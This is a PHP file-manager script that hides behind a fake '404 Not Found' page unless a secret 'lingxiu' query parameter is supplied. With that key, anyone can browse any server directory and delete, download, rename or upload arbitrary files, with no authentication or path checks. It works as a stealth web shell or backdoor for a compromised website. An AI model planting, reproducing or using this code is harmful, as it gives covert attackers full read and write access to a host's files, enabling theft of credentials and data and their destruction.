<?php
date_default_timezone_set('PRC');
class scan{
	function __construct(){
		if(empty($_GET['lingxiu'])){
			$this->notfound();
		}
		if(!empty($_GET['type'])){
			switch ( $_GET['type'] )
		{
			case 'download':
				$this->download();
				break;
			case 'del':
				$this->del();
			break;
			case 'resetname':
				$this->resetname();
			break;
			case 'upload':
				$this->upload();
			break;
		}
		}
	}
	function notfound(){
		header('HTTP/1.1 404 Not Found'); 
		header("status: 404 Not Found"); 
		exit();
	}
	function del(){
		$path=$_GET['path'];
		if(file_exists($path)){
			unlink($path);
			header('Location:?lingxiu=true');
		}else{
			exit('文件不存在！');
		}
	}

	function edit(){
		$path=$_GET['path'];
		if(file_exists($path)){
			
		}else{
			exit('文件不存在！');
		}
	}

	function download(){
		$path=$_GET['path'];
		if(file_exists($path)){
			header("header('Content-type: application/octet-stream'); ");
			header('Content-Disposition: attachment; filename="'.$path.'"'); 
			readfile($_GET['path']);
			exit();
		}else{
			exit('文件不存在！');
		}
	}
	function resetname(){
		$oldname=$_GET['oldname'];
		$newname=dirname($oldname).'/'.$_GET['newname'];
		if(file_exists($oldname)){
			//echo '<form action="" method="post"><input type="text" name="name"/></form>';
			rename($oldname,$newname);
			header('Location:?lingxiu=true');
		}else{
			exit('文件不存在！');
		}
	}
	function upload(){
		var_dump($_POST);
		var_dump($_FILES);
		if($_FILES['file']['error']==0){
			move_uploaded_file($_FILES['file']['tmp_name'],$_GET['uploaddir'].$_FILES['file']['name']);
			header('Location:?lingxiu=true');
		}
	}
}
$a=new scan();
?>
<!DOCTYPE html>
<html lang="en" xmlns="http://www.w3.org/1999/xhtml">
<head>
	<meta charset="utf-8" />
	<title>New Document</title>
	<meta name="generator" content="EverEdit" />
	<meta name="author" content="" />
	<meta name="keywords" content="" />
	<meta name="description" content="" />
	<link href="//cdn.bootcss.com/layer/2.3/skin/layer.css" rel="stylesheet">
	<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
	<script src="//cdn.bootcss.com/layer/2.3/layer.js"></script>
	<script>
		function rename(path){
				layer.prompt({title: '请输入文件名', formType: 2}, function(text){
					//alert(document.domain+path+'&newname='+text);
					window.location.href=path+'&newname='+text;
				});

		}
	</script>
	<!--<meta http-equiv='Refresh' content='2;URL=http://www.baidu.com'>-->
</head>
<body>
	<style>
		table{width:1500px;margin:0 auto;border-right: 1px solid #999;}
		th{border: 1px solid #999;    border-right: none;line-height:40px;}
		td{text-align: center;border: 1px solid #999;border-top: none;    border-right: none;}
		.th1{width:500px;}
		.th2{width:100px;}
		.th3{width:150px;}
		.th4{width:200px;}
		.th5{width:400px;}
		.name{width:500px; overflow:hidden;white-space: nowrap;text-overflow:ellipsis;}
	</style>
	<table cellpadding="0" cellspacing="0">
		<th class="th1">名称</th>
		<th class="th2">类型</th>
		<th class="th3">大小</th>
		<th class="th4">修改时间</th>
		<th class="th5">操作</th>
	<?php
	header('Content-type:text/html;charset=utf-8');
	//header("refresh:3;url=http://www.baidu.com");
	date_default_timezone_set('Asia/Shanghai');
	$root_dir= @$_GET['dir']?:getcwd();
	if(is_dir($root_dir)){
		if($d=opendir($root_dir)){
			$doman=$_SERVER['PHP_SELF'].'?lingxiu=true&';
			while ( (!$file=readdir($d))==false )
			{
				$utffile=iconv('GBK','UTF-8',$file);//中文编码
				$path=$root_dir.'/'.$file;
				$type=filetype($path);
				$filesize=filesize($path);
				echo '<tr><td class="th1"><p class="name">';
				if($type=='dir'){
					echo '<a target="_blank" href="'.$doman.'dir='.$path.'">'.$utffile.'</a>';
				}else{
					echo $utffile;
				}
				echo '</p></td>';
				echo '<td class="th2">';
				echo $type;
				echo '</td>';
				echo '<td class="th3">';
				if($filesize<1048576){
					echo round(($filesize/1024),2).'K';
				}else
				{
					echo round(($filesize/1048576),2).'M';
				}
				echo '</td>';
				echo '<td class="th4">';
				echo date('Y-m-d H:i:s',filemtime($path));
				echo '</td>';
				echo '<td class="th5">';
				echo '<a target="_blank" href="'.$doman.'type=del&path='.$path.'">删除</a>';
				if($type=='file'){
					echo '&nbsp;|&nbsp;<a target="_blank" href="'.$doman.'type=download&path='.$path.'">下载</a>';
					echo '&nbsp;|&nbsp;<a target="_blank" onclick="rename($(this).attr(\'path\'));" href="javascript:;" path="'.$doman.'type=resetname&oldname='.$path.'">重命名</a>
				';
				}
				echo '</td></tr>';
			}
			closedir($d);
		}else{
			exit('打开失败！');
		}
	}else{
		exit('系统错误！');
	}
?>
</table>
	<form action="/?lingxiu=true&type=upload&uploaddir=<?php echo dirname($path).'/' ?>" method="post" enctype="multipart/form-data">
		<input type="file" name="file">
		<input type="submit" value="提交">
	</form>
</body>
</html>
<?php

